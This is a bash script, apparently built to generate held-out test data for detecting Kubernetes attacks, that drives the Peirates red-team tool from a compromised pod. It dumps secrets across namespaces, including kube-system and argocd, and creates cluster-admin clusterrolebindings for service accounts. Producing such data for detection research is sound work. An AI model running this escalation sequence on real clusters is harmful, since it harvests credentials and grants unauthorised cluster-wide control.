#!/usr/bin/env bash
# Held-out escalation with Peirates (InGuardians), tool-disjoint from training (synthetic + Stratus).
# Peirates ruleaza IN pod (binar linux), sub SA-ul compromis redteam-peirates (cluster-admin = token privilegiat furat).
# readline-ul lui Peirates se blocheaza pe DSR in PTY si desincronizeaza pe stdin multi-linie -> rulam O comanda/invocare.
# Fiecare comanda e un `kubectl` executat de Peirates (optiunea off-menu 90), atribuit identitatii redteam-peirates in audit.
set -uo pipefail
OUT="$(cd "$(dirname "$0")/../reference" && pwd)"; SF="$OUT/sessions.txt"; mkdir -p "$OUT"; touch "$SF"
POD=peirates-attacker; NS=default
nowZ(){ date -u +%Y-%m-%dT%H:%M:%SZ; }
pei(){ printf '%s\nexit\n' "$1" | kubectl exec -i "$POD" -n "$NS" -- /peirates 2>&1 \
       | grep -iE "created|deleted|NAME |No resources|forbidden|error from server" | head -3; }

# clean up clusterrolebindings left by earlier runs
kubectl delete clusterrolebinding pwn-peirates-1 pwn-peirates-2 pwn-peirates-test >/dev/null 2>&1 || true
grep -v "^SESSION 13 " "$SF" > "$SF.tmp" && mv "$SF.tmp" "$SF"

# escalation sequence, produced by Peirates from a privileged token
CMDS=(
 "get secrets -A"
 "get secrets -n kube-system"
 "get secrets -n cert-manager"
 "get secrets -n argocd"
 "get secrets -n monitoring"
 "get serviceaccounts -A"
 "create clusterrolebinding pwn-peirates-1 --clusterrole=cluster-admin --serviceaccount=default:redteam-peirates"
 "create clusterrolebinding pwn-peirates-2 --clusterrole=cluster-admin --serviceaccount=default:default"
 "get clusterrolebindings"
 "get clusterroles"
 "get nodes"
 "get pods -A"
 "get secrets -A"
 "get secrets -n kube-system"
 "get secrets -n cert-manager"
 "get secrets -n argocd"
 "get serviceaccounts -A"
 "get pods -A"
 "get secrets -A"
 "get configmaps -A"
 "get rolebindings -A"
 "get roles -A"
 "get secrets -n kube-system"
 "get secrets -n cert-manager"
)
echo "SESSION 13 START $(nowZ)" >> "$SF"
i=0
for c in "${CMDS[@]}"; do
  i=$((i+1)); printf "  [%2d/%d] peirates kubectl %s\n" "$i" "${#CMDS[@]}" "$c"
  pei "kubectl $c"
done
echo "SESSION 13 END $(nowZ)" >> "$SF"
echo ">> done (held out). clusterrolebindings Peirates created:"
kubectl get clusterrolebinding pwn-peirates-1 pwn-peirates-2 2>&1 | head -3
tail -2 "$SF"
